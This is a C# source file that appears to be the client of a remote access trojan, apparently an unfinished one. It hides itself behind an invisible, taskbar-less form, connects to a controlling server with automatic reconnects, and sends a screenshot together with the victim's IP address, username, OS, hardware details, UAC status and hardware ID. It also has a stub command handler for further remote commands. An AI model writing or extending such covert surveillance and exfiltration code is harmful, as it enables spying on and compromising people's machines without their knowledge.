using LazyServer;
using Newtonsoft.Json.Linq;
using PentestTools;
using System;
using System.Drawing;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace Client
{
    internal static class Program
    {
        public static JObject config = GClass.config();

        [STAThread]
        static void Main()
        {
            Application.EnableVisualStyles();
            Application.SetCompatibleTextRenderingDefault(false);

            // Run your async code on startup
            Task.Run(RunClientAsync);

            // Optionally run a hidden form to keep app alive
            Application.Run(new InvisibleForm());
        }

        static async Task RunClientAsync()
        {
            GClass.ShowCmd(GClass.IsTrue("debug")); // likely does nothing now

            var client = new LazyServerClient();
            await GClass.ReconnectLoop(client);

            client.Disconnected += async (s, e) => {
                await GClass.ReconnectLoop(client);
            };

            var ss = ScreenCapture.CaptureScreenWithCursor();

            await client.SendFileBytesWithMeta(ss, new JObject
            {
                ["msg"] = "alive",
                ["ip"] = await GClass.GetIp(),
                ["username"] = DeviceInfo.GetUsername(),
                ["os"] = DeviceInfo.GetOSInfo(),
                ["cpu"] = DeviceInfo.GetCPUInfo(),
                ["gpu"] = DeviceInfo.GetGPUInfo(),
                ["uac"] = DeviceInfo.GetUACStatus(),
                ["hwid"] = DeviceInfo.GetHWID(),
            }.ToString());
            client.MessageReceived += (s, e) =>
            {
                try
                {
                    JObject message = JObject.Parse(e.Message);
                    switch ((string)message["command"]) {
                        case "ssloop":

                    };
                }
                catch {
                
                };
            };
        }
    }

    public class InvisibleForm : Form
    {
        public InvisibleForm()
        {
            ShowInTaskbar = false;
            WindowState = FormWindowState.Minimized;
            FormBorderStyle = FormBorderStyle.None;
            Opacity = 0;
            Load += (s, e) => Hide();
        }
    }
}
